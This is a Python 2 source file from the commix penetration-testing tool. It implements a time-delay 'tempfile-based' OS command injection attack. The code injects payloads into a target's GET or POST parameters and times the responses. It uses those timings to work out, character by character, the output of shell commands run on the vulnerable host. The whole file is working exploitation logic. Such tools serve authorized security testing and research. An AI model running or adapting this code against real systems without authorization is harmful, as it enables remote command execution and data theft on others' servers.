#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import urllib
import urllib2

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_payloads

"""
 The "tempfile-based" injection technique on Semiblind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""

#-----------------------------------------
# Check if target host is vulnerable.
#-----------------------------------------
def injection_test(payload,http_request_method,url):
  
  start = 0
  end = 0
  start = time.time()
  
  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    # Check if its not specified the 'INJECT_HERE' tag
    url = parameters.do_GET_check(url)
    
    # Encoding non-ASCII characters payload.
    payload = urllib.quote(payload)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
      
    target = re.sub(settings.INJECT_TAG, payload, url)
    request = urllib2.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)
    
    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
        proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)
        response = urllib2.urlopen(request)
        response.read()
        
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
        sys.exit(1) 

    else:
      try:
        response = urllib2.urlopen(request)
        response.read()
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
        sys.exit(1) 
      
  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter,url)
    
    # Define the POST data
    data = re.sub(settings.INJECT_TAG, payload, parameter)
    request = urllib2.Request(url, data)
    
    # Check if defined extra headers.
    headers.do_check(request)
    
    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
        proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)
        response = urllib2.urlopen(request)
        response.read()
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
        sys.exit(1) 

    else:
      try:
        response = urllib2.urlopen(request)
        response.read()
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
        sys.exit(1) 
      
  end  = time.time()
  how_long = int(end - start)

  return how_long,vuln_parameter


#----------------------------------------------
# The main command injection exploitation.
#----------------------------------------------
def injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell):
  if menu.options.file_write or menu.options.file_upload :
    minlen = 0
  else:
    minlen = 1
    
  print "\n(*) Retrieving the length of execution output..."
  for output_length in range(int(minlen),int(maxlen)):
    
    # Execute shell commands on vulnerable host.
    if not alter_shell :
      payload = tfb_payloads.cmd_execution(separator,cmd,output_length,OUTPUT_TEXTFILE,delay,http_request_method)
    else:
      payload = tfb_payloads.cmd_execution_alter_shell(separator,cmd,output_length,OUTPUT_TEXTFILE,delay,http_request_method)

    # Check if defined "--verbose" option.
    if menu.options.verbose:
      sys.stdout.write("\n" + Fore.GREY + payload.replace("\n","\\n") + Style.RESET_ALL)
      
    start = 0
    end = 0
    start = time.time()
    
    # Check if defined method is GET (Default).
    if http_request_method == "GET":
      payload = urllib.quote(payload)
      
      # Check if its not specified the 'INJECT_HERE' tag
      url = parameters.do_GET_check(url)
      
      target = re.sub(settings.INJECT_TAG, payload, url)
      vuln_parameter = ''.join(vuln_parameter)
      
      #print target
      request = urllib2.Request(target)
  
      # Check if defined extra headers.
      headers.do_check(request)
                      
      # Check if defined any HTTP Proxy.
      if menu.options.proxy:
        try:
          proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
          opener = urllib2.build_opener(proxy)
          urllib2.install_opener(opener)
          response = urllib2.urlopen(request)
          response.read()
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
          sys.exit(1) 
  
      else:
        try:
          response = urllib2.urlopen(request)
          response.read()
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
          sys.exit(1) 
        
    # Check if defined method is POST.
    else :
      parameter = menu.options.data
      parameter = urllib2.unquote(parameter)
      
      # Check if its not specified the 'INJECT_HERE' tag
      parameter = parameters.do_POST_check(parameter)
      
      data = re.sub(settings.INJECT_TAG, payload, parameter)
      request = urllib2.Request(url, data)
      
      # Check if defined extra headers.
      headers.do_check(request)

      # Check if defined any HTTP Proxy.
      if menu.options.proxy:
        try:
          proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
          opener = urllib2.build_opener(proxy)
          urllib2.install_opener(opener)
          response = urllib2.urlopen(request)
          response.read()
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
          sys.exit(1) 
  
      else:
        try:
          response = urllib2.urlopen(request)
          response.read()
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
          sys.exit(1) 
        
    end  = time.time()
    how_long = int(end - start)
    
    if how_long >= delay:
      if menu.options.verbose:
        print "\n"
      print Style.BRIGHT + "(!) Retrieved " + str(output_length) + " characters."+ Style.RESET_ALL
      break
              
  num_of_chars = output_length + 1
  check_start = 0
  check_end = 0
  check_start = time.time()
  
  output = []
  for num_of_chars in range(1,int(num_of_chars)):
    for ascii_char in range(32, 129):
      
      # Get the execution ouput, of shell execution.
      if not alter_shell :
        payload = tfb_payloads.get_char(separator,OUTPUT_TEXTFILE,num_of_chars,ascii_char,delay,http_request_method)
      else:
        payload = tfb_payloads.get_char_alter_shell(separator,OUTPUT_TEXTFILE,num_of_chars,ascii_char,delay,http_request_method)
        
      # Check if defined "--verbose" option.
      if menu.options.verbose:
        sys.stdout.write("\n" + Fore.GREY + payload.replace("\n","\\n") + Style.RESET_ALL)
        
      start = 0
      end = 0
      start = time.time()
      
      if http_request_method == "GET":
        payload = urllib.quote(payload)
        target = re.sub(settings.INJECT_TAG, payload, url)
        vuln_parameter = ''.join(vuln_parameter)
        request = urllib2.Request(target)
        
        # Check if defined extra headers.
        headers.do_check(request)
          
        # Check if defined any HTTP Proxy.
        if menu.options.proxy:
          try:
            proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
            opener = urllib2.build_opener(proxy)
            urllib2.install_opener(opener)
            response = urllib2.urlopen(request)
            response.read()
          except urllib2.HTTPError, err:
            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
            sys.exit(1) 
    
        else:
          try:
            response = urllib2.urlopen(request)
            response.read()
          except urllib2.HTTPError, err:
            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
            sys.exit(1) 
          
      else :
        parameter = urllib2.unquote(parameter)
        data = re.sub(settings.INJECT_TAG, payload, parameter)
        request = urllib2.Request(url, data)
        
        # Check if defined extra headers.
        headers.do_check(request)
          
        # Check if defined any HTTP Proxy.
        if menu.options.proxy:
          try:
            proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
            opener = urllib2.build_opener(proxy)
            urllib2.install_opener(opener)
            response = urllib2.urlopen(request)
            response.read()
          except urllib2.HTTPError, err:
            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
            sys.exit(1) 
    
        else:
          try:
            response = urllib2.urlopen(request)
            response.read()
          except urllib2.HTTPError, err:
            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
            sys.exit(1) 
          
      end  = time.time()
      how_long = int(end - start)

            
      if how_long >= delay:
        if not menu.options.verbose:
          output.append(chr(ascii_char))
          percent = ((num_of_chars*100)/output_length)
          sys.stdout.write("\r(*) Grabbing the output from '" + OUTPUT_TEXTFILE + "', please wait... [ "+str(percent)+"% ]")
          sys.stdout.flush()
        else:
          output.append(chr(ascii_char))
        break
          
  check_end  = time.time()
  check_how_long = int(check_end - check_start)

  output = "".join(str(p) for p in output)
  return  check_how_long,output
    
#eof
